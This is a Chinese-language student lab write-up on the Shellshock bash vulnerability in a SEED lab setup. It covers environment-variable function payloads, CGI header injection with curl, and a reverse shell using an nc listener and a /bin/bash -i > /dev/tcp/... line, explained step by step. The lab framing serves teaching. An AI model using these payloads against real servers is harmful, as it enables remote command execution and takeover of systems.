三、实验任务：

1、使用bash函数：

  • 设计一个实验来检验bash_shellshock程序是否有shellshock漏洞，并在正常的bash程序中也进行这个实验。

  • 使用bash函数来检验，原理：

    • 子shell进程将某些环境变量转换成shell函数时，由于解析逻辑的漏洞，不仅会解析变量中的指令，可能还会执行变量中的指令。

  • 测试bash_shellshock：

    • 首先在正常的父bash进程中定义：export foo=’() { echo “hello world”;}; echo “shellshock”; echo $$’
    • 启动bash_shellshock，发现成功执行了指令，即存在shellshock漏洞

  • 测试正常bash：
    • 首先在正常的父bash进程中定义：export foo=’() { echo “hello world”;}; echo “shellshock”; echo $$’
    • 启动正常的bash，发现子shell进程没有执行指令，不存在shellshock漏洞

2、通过环境变量向bash传递数据：

  • 浏览器访问：http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi

  • 回显的环境变量：

  • f12查看网络中对应GET请求的请求头：

  • 比较发现，GET请求中的请求头出现在回显的环境变量中的有：
    • Host、User-Agent、Accept、Accept-Language、Connection、
    • Upgrade-Insecure-Request、Cache-Control

2.2curl命令：

  • 使用curl命令，可以轻松控制http请求中的各项参数
  • 测试以下参数分别设置http请求中的哪些信息
  • -v参数可以打印http通信的头部信息：curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
    • 如果没有-v，则不会打印前面的请求头和响应头，只会打印后面的响应体内容（即环境变量）

  • -A参数：curl -A “my data” -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
    • 发现请求头中的User-Agent被设置为 my data

  • -e参数：curl -e “my data” -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
    • 设置Referer

  • -H参数：curl -H “AAAAAA: BBBBBB” -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
    • 设置了一个全新的请求头

3.5问题：

  • 问题1：能否获取/etc/shadow的内容
    • 不能，因为shellshock攻击的进程用户是www-data是普通用户，执行命令是也是普通用户的权限
  • 问题2：程序将Get参数设置为环境变量时，能否实行shellshock攻击
    • 不能（单纯设置为环境变量不行，还要使用system再启动一个shell）
    • 在当前进程中设置为环境变量，只是单纯的设置了一个值，不会触发解析为shell函数的解析漏洞，从而不会有shellshock漏洞。

  • getenv.cgi已经写好了相应功能，访问curl “http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA“
    • 发现打印出了QUERY_STRING=AAAA环境变量

  • 更改Get参数，让其执行id指令
  • 返回如下，应该是Get参数格式的问题

  • 将Get参数中的空格使用%20替代
  • 再次执行，发现成功执行了CGI程序，但是没有执行恶意指令

4、获得反弹shell：

  • 演示如何获得反弹shell。
  • 攻击者：nc -lvnp 9090，启动TCP服务器，并监听9090端口

  • 反弹shell指令：/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
    • /bin/bash -i ，交互模式下启动bash，此时会提供提示符
    • >/dev/tcp/10.0.2.15/9090，表示前面的bash程序的标准输出1被重定向到TCP网络连接，会将shell的输出发送到TCP连接。
    • 0<&1，标准输入0重定向到标准输出1，即输出也被用作输入，输出已被重定向到TCP连接，所以会从TCP连接中获得输入。
    • 2>&1，将标准错误输出2重定向到标准输出1。1已经重定向到TCP连接，故将shell错误信息发送到TCP连接
  • 获取宿主机ip，使docker容器能访问：ifconfig指令，比较docker容器的ip，应该选择10.9.0.1

  • 攻击者利用shellshock让服务器执行反弹shell指令：10.9.0.1

  • nc窗口成功接收到shell
